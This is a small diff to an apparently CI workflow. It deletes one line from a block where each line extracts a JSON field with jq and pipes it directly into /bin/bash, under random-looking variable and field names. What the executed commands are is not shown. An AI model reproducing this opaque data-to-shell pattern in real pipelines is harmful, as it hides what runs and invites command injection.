@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$iye96" | jq -r .scpw25973 | /bin/bash
           printf '%s' "$ti88" | jq -r .lwou02721 | /bin/bash
           printf '%s' "$l2705" | jq -r .c76 | /bin/bash
-          echo $idt56 | jq -r .s68809 | /bin/bash
           echo $o39 | jq -r .sx43531 | /bin/bash
 
       - name: Save results
